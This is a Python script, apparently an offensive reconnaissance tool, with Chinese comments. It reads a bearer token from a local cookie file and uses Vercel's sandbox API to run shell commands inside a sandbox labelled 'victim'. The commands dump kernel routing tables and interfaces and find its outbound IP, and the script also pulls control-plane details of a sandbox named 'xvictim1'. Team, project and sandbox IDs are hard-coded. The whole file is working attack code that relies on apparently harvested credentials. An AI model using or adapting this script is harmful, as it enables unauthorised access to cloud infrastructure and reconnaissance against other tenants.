# -*- coding: utf-8 -*-
"""X 线: 获取 victim 沙箱本机 IP (fib_trie / route) + 控制面 sandbox 详情字段"""
import json, re, sys, urllib.request, urllib.error

raw = open(r'F:\scan\vercel_cookies2.txt', encoding='utf-8', errors='replace').read().strip()
m = re.search(r'authorization=\s*Bearer\s+(\S+)', raw, re.I)
TOK2 = m.group(1) if m else raw
TEAM2 = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ2 = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'
BASE = 'https://api.vercel.com'
SID = 'sbx_kha5wxbV905yjutN6QyiONISv4d1'

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(BASE + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOK2)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')[:600]
    except Exception as e:
        return -1, '%s' % e

def cmd_v(sid, command, args, timeout_ms=30000):
    body = {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms}
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM2), body, timeout=timeout_ms / 1000 + 30)
    return c, r

# 1) 沙箱内读内核路由表
c, r = cmd_v(SID, 'sh', ['-c', 'cat /proc/net/fib_trie 2>/dev/null | head -60; echo ---ROUTE---; cat /proc/net/route; echo ---IF---; cat /proc/net/dev | head -10'])
print('=== fib_trie ->', c, flush=True)
print(r[:2500], flush=True)

# 2) python 方式获取 IP
c, r = cmd_v(SID, 'python3', ['-c', "import socket,struct; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('172.31.0.2',53)); print('OUT_IP', s.getsockname()[0]); s.close()"], timeout_ms=20000)
print('=== out ip ->', c, flush=True)
print(r[:800], flush=True)

# 3) 控制面 sandbox 详情字段
c, r = api('GET', '/v2/sandboxes/xvictim1?teamId=%s&projectId=%s' % (TEAM2, PROJ2))
print('=== get sandbox ->', c, flush=True)
try:
    d = json.loads(r)
    sb = d.get('sandbox', d)
    print(json.dumps(sb, indent=1)[:2000], flush=True)
except Exception:
    print(r[:800], flush=True)

print('=== IPINFO DONE ===', flush=True)
